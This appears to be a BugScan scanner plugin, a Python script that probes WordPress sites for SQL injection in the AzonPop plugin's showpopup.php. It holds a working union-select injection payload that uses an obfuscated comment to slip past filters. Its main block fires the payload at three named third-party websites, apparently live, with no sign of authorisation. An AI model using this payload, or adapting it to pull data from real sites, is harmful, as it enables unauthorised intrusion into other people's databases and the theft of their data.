#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = Madking
#_PlugName_ = Wordpress AzonPop Plugin SQL Injection
#__Refer___ = https://www.bugscan.net/#!/x/1998
import re
def assign(service, arg):
    if service == 'wordpress':
        return True, arg
def audit(arg):
    payload = 'wp-content/plugins/AzonPop/files/view/showpopup.php?popid=null%20%20/*!00000union*/%20select%201,2,md5(1),4,5'
    target = arg + payload
    
    code, head, res, errcode, _ = curl.curl2(target);
    if code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in res :
        security_hole(target)
if __name__ == '__main__':
    from dummy import *
    audit(assign('wordpress', 'http://diabetescare.siterubix.com/')[1])
    audit(assign('wordpress', 'http://haircareproducts.siterubix.com/')[1])
    audit(assign('wordpress', 'http://babyshower.giftbuy.info/')[1])